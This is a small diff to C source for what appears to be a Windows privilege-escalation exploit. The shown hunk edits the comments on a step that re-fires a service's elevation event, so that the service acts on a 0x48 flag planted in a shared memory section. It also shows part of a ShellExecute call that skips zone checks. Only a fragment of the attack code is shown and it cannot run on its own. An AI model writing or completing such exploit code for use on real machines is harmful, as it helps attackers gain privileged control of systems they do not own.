@@ -62,8 +62,10 @@ int wmain() {
         }
     }
 
-    // Re-fire the elevation event so the service re-enters the code path
-    // that reads the shared section and acts on the written flag.
+    // Re-fire the elevation event — forces the service back into the code path
+    // that reads the shared section and acts on the 0x48 flag.
+    // NOTE: system("net helpmsg") is a lookup command; it sends no signal to
+    // the service and must not be used here.
     {
         SHELLEXECUTEINFO retrigger = { sizeof(retrigger) };
         retrigger.fMask = SEE_MASK_NOZONECHECKS;
